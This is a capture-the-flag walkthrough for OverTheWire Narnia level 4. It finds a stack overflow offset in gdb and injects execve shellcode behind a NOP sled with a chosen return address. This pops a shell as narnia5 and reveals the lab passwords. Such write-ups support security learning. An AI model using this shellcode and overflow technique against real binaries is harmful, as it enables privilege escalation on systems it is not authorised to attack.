## Login 

` SSH : ssh narnia4@narnia.labs.overthewire.org -p 2226 `
` Pass : iqNWNk173q `

## Solution

First, let’s try to execute the program…

```
$ ssh narnia4@narnia.labs.overthewire.org -p 2226

narnia4@narnia:~$ cd /narnia/
narnia4@narnia:/narnia$ ./narnia4
```

Nothing… weird.
### Source Code

Let’s check the source.

```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

This one is similar to the **level 2** however, we don’t have any output or result from the program. Here, the **buffer** variable is **256** bytes long and again, no boundary check. Let’s find where we overflow the return address…

```
$ gdb narnia4

(gdb) set disassembly-flavor intel
(gdb) run $(python -c 'print 264 * "A" + 4 * "B"')
Starting program: /narnia/narnia4 $(python -c 'print 264 * "A" + 4 * "B"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

So, **256** bytes of garbage and **4** more bytes to overwrite the return address. To exploit this one I used the following shellcode :

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

Let’s find a return address. Here, I placed a return address right after the _strcpy()_ call :

```
(gdb) break *main+121
Breakpoint 1 at 0x8048524

(gdb) run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 4 * "B"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + 4 * "B"')

Breakpoint 1, 0x08048524 in main ()
(gdb) x/100x $esp+600
0xffffd6e4:	0x00000000	0x00000009	0x080483b0	0x0000000b
0xffffd6f4:	0x000036b4	0x0000000c	0x000036b4	0x0000000d
0xffffd704:	0x000036b4	0x0000000e	0x000036b4	0x00000017
0xffffd714:	0x00000001	0x00000019	0xffffd74b	0x0000001a
0xffffd724:	0x00000000	0x0000001f	0xffffdfe8	0x0000000f
0xffffd734:	0xffffd75b	0x00000000	0x00000000	0x00000000
0xffffd744:	0x00000000	0xb9000000	0x47bfa236	0xde88977b
0xffffd754:	0x969dbe24	0x69e65cf5	0x00363836	0x00000000
0xffffd764:	0x00000000	0x616e2f00	0x61696e72	0x72616e2f
0xffffd774:	0x3461696e	0x90909000	0x90909090	0x90909090
0xffffd784:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd794:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7a4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7b4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7c4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7d4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7e4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7f4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd804:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd814:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd824:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd834:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd844:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd854:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd864:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
```

We’ll use `0xffffd7b4` as it is in the middle of the _NOP sled_.

```
(gdb) run $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')

Breakpoint 1, 0x08048524 in main ()
(gdb) conti
Continuing.
process 22763 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$
```

Looks like it worked. Let’s do the same outside GDB.

```
narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
Ni3xHPEuuw
```

Success !